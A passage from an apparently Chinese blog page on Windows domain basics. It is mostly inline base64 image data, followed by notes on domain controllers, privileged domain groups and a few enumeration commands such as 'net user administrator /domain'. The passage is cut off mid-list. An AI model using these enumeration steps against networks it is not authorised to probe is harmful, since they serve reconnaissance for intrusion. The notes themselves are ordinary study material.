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" alt="img"></p><p>​DNS服务器：可以依靠dns定位域控</p><p>​域内用户组</p><p>​Domain admins：域管理组</p><p>​Domain users：域内用户组</p><p>​Enterprise admins：企业系统管理组（权限比较高）</p><p>​Schema admmins：架构管理员组（权限比较高）</p><h3 id="1-域内常见命令"><a href="#1-域内常见命令" class="headerlink" title="1.域内常见命令"></a>1.域内常见命令</h3><p>​<code>net coonfig workstation</code>：查看当前登录域</p><p>​<code>Ipconfig /all</code>：计算机的网络连接情况,包括IP地址、DNS、DHCP、mac地址、DC等</p><p>​<code>ping DC</code>-&gt;可以得到该域控主机的ip地址</p><p>​<code>net user administrator /domain</code>：查看登录本机管理员在域内的详细信息</p><p>​<code>net time 